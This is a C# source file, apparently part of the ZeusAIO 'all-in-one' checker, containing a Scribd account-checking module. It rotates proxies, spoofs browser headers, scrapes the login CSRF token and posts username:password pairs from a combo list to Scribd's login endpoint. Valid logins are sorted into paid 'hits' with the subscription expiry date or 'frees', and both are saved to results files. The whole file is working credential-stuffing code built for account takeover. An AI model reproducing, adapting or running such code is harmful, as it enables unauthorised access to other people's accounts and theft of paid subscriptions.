using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Scribd
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36rv:11.0) like Gecko");
                            httpRequest.AddHeader("Pragma", "no-cache");
                            httpRequest.AddHeader("Accept", "*/*");
                            httpRequest.AddHeader("origin", "https://www.scribd.com");
                            httpRequest.AddHeader("referer", "https://www.scribd.com/login");
                            httpRequest.AddHeader("sec-fetch-dest", "empty");
                            httpRequest.AddHeader("sec-fetch-mode", "cors");
                            httpRequest.AddHeader("sec-fetch-site", "same-origin");
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string getscrf = httpRequest.Get("https://www.scribd.com/login", null).ToString();
                            string csrf = Check.Parse(getscrf, "name=\"csrf-token\" content=\"", "\" />");
                            //--------------------------------------
                            httpRequest.ClearAllHeaders();
                            httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36rv:11.0) like Gecko");
                            httpRequest.AddHeader("Pragma", "no-cache");
                            httpRequest.AddHeader("Accept", "*/*");
                            httpRequest.AddHeader("origin", "https://www.scribd.com");
                            httpRequest.AddHeader("referer", "https://www.scribd.com/login");
                            httpRequest.AddHeader("sec-fetch-dest", "empty");
                            httpRequest.AddHeader("sec-fetch-mode", "cors");
                            httpRequest.AddHeader("sec-fetch-site", "same-origin");
                            httpRequest.AddHeader("x-csrf-token", csrf);
                            httpRequest.AddHeader("x-requested-with", "XMLHttpRequest");

                            string str = "{\"login_or_email\":\"" + s[0] + "\",\"login_password\":\"" + s[1] + "\",\"rememberme\":\"\",\"signup_location\":\"https://www.scribd.com/login\",\"login_params\":{}}";
                            string strResponse = httpRequest.Post("https://www.scribd.com/login", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("No account found with that email or username. Please try again or sign up.\"}]}") || strResponse.Contains("Invalid password. Please try again"))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("success\":true")) //hit
                                {
                                    httpRequest.ClearAllHeaders();
                                    httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36");
                                    httpRequest.AddHeader("Pragma", "no-cache");
                                    httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                                    string cap = httpRequest.Get("https://www.scribd.com/account-settings", null).ToString();
                                    if (cap.Contains("next_payment_date\":\""))
                                    {
                                        string validtill = Check.Parse(cap, "next_payment_date\":\"", "\",\"");
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - SCRIBD] " + s[0] + ":" + s[1] + " | Valid till: " + validtill, Color.Green);
                                        }
                                        Export.AsResult("/Scribd_hits", s[0] + ":" + s[1] + " | Valid till: " + validtill);
                                        return false;
                                    }
                                    else
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - SCRIBD] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Scribd_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }



                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            //break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        public static int s;
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

